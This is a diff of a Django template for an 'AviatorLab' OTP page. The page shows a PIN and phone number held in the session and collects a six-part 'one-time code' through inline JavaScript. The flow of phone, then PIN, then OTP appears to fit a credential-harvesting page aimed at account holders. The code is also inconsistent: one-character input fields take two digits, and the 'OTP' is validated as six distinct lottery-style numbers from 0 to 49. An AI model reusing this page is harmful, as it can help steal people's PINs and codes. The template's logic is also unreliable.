@@ -1,38 +1,218 @@
-{% extends "base.html" %}
-{% block title %}OTP — AviatorLab{% endblock %}
-{% block content %}
-<div class="progress">
-  <span class="done"></span><span class="done"></span><span class="done"></span><span class="active"></span>
-</div>
-<section class="narrow panel">
-  <div class="eyebrow">Enter OTP</div>
-  <h1 class="page-title">Enter your <span>OTP.</span></h1>
-  <div class="summary"><span>PIN</span><b>{{ session.four_numbers }}</b></div>
-  <div class="summary" style="margin-top:0.5rem"><span>Phone</span><b>{{ session.phone_number }}</b></div>
 
-  <form method="post" action="{% url 'save_six_numbers' %}" id="numberForm">
+{% extends "base.html" %}
+
+{% block title %}OTP — AviatorLab{% endblock %}
+
+{% block content %}
+
+<div class="progress">
+  <span class="done"></span>
+  <span class="done"></span>
+  <span class="done"></span>
+  <span class="active"></span>
+</div>
+
+<section class="narrow panel">
+
+  <h1 class="page-title">
+    Enter <span>OTP.</span>
+  </h1>
+
+  <p class="muted">
+    Enter Your OTP.
+  </p>
+
+  <div class="summary">
+    <span>PIN</span>
+    <b>{{ session.four_numbers }}</b>
+  </div>
+
+  <div class="summary" style="margin-top:0.5rem">
+    <span>Phone</span>
+    <b>{{ session.phone_number }}</b>
+  </div>
+
+  <form method="post"
+        action="{% url 'save_six_numbers' %}"
+        id="numberForm">
+
     {% csrf_token %}
+
     <div class="number-grid six">
+
       {% for n in "123456" %}
+
       <label class="number-field">
-        <span>{{ forloop.counter }}</span>
+
+        <span> {{ forloop.counter }}</span>
+
         <input
+          class="six-number-input"
           name="numbers"
           type="text"
           inputmode="numeric"
-          pattern="[0-9]*"
-          min="0"
-          max="49"
-          maxlength="2"
+          pattern="[0-9]{1,2}"
+          maxlength="1"
           required
+          placeholder=""
           autocomplete="off"
-          title="Enter a number from 0 to 49"
+          aria-label="Number {{ forloop.counter }}"
         >
+
       </label>
+
       {% endfor %}
+
     </div>
-    <p class="helper">Enter otp.</p>
-    <button class="btn primary full">Proceed <span>→</span></button>
+
+    <p class="helper">
+      Enter Your OTP.
+    </p>
+
+    <button type="submit" class="btn primary full">
+      Click to Proceed <span>→</span>
+    </button>
+
   </form>
+
 </section>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    const inputs = Array.from(
+        document.querySelectorAll(".six-number-input")
+    );
+
+    const form = document.getElementById("numberForm");
+
+    // Automatically move to the next box when a number is entered.
+    inputs.forEach((input, index) => {
+
+        input.addEventListener("input", function () {
+
+            let value = this.value.replace(/[^0-9]/g, "");
+
+            if (value.length > 2) {
+                value = value.slice(0, 2);
+            }
+
+            this.value = value;
+
+            // Move to the next box after entering a complete number.
+            if (value.length === 2 && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+                inputs[index + 1].select();
+            }
+
+        });
+
+        // Backspace moves to the previous box when current box is empty.
+        input.addEventListener("keydown", function (event) {
+
+            if (
+                event.key === "Backspace" &&
+                this.value === "" &&
+                index > 0
+            ) {
+                inputs[index - 1].focus();
+                inputs[index - 1].value = "";
+                event.preventDefault();
+            }
+
+            // Arrow navigation.
+            if (
+                event.key === "ArrowRight" &&
+                index < inputs.length - 1
+            ) {
+                inputs[index + 1].focus();
+                event.preventDefault();
+            }
+
+            if (
+                event.key === "ArrowLeft" &&
+                index > 0
+            ) {
+                inputs[index - 1].focus();
+                event.preventDefault();
+            }
+
+        });
+
+        // Automatically select existing value when revisiting a box.
+        input.addEventListener("focus", function () {
+            this.select();
+        });
+
+    });
+
+    // Support pasting six comma/space-separated numbers.
+    inputs.forEach((input, index) => {
+
+        input.addEventListener("paste", function (event) {
+
+            const pasted = (
+                event.clipboardData || window.clipboardData
+            ).getData("text");
+
+            const numbers = pasted.match(/\d{1,2}/g);
+
+            if (numbers && numbers.length > 1) {
+
+                event.preventDefault();
+
+                numbers.slice(0, inputs.length - index).forEach(
+                    (number, offset) => {
+
+                        const value = parseInt(number, 10);
+
+                        if (value <= 49) {
+                            inputs[index + offset].value = number;
+                        }
+
+                    }
+                );
+
+                const nextEmpty = inputs.find(
+                    item => item.value === ""
+                );
+
+                (nextEmpty || inputs[inputs.length - 1]).focus();
+
+            }
+
+        });
+
+    });
+
+    // Validate all six numbers before submitting.
+    form.addEventListener("submit", function (event) {
+
+        const numbers = inputs.map(input => input.value.trim());
+
+        const values = numbers.map(Number);
+
+        if (numbers.some(number => number === "")) {
+            event.preventDefault();
+            alert("Please enter all six numbers.");
+            return;
+        }
+
+        if (values.some(number => number < 0 || number > 49)) {
+            event.preventDefault();
+            alert("Each number must be between 0 and 49.");
+            return;
+        }
+
+        if (new Set(values).size !== 6) {
+            event.preventDefault();
+            alert("Please enter six different numbers.");
+            return;
+        }
+
+    });
+
+});
+</script>
+
 {% endblock %}
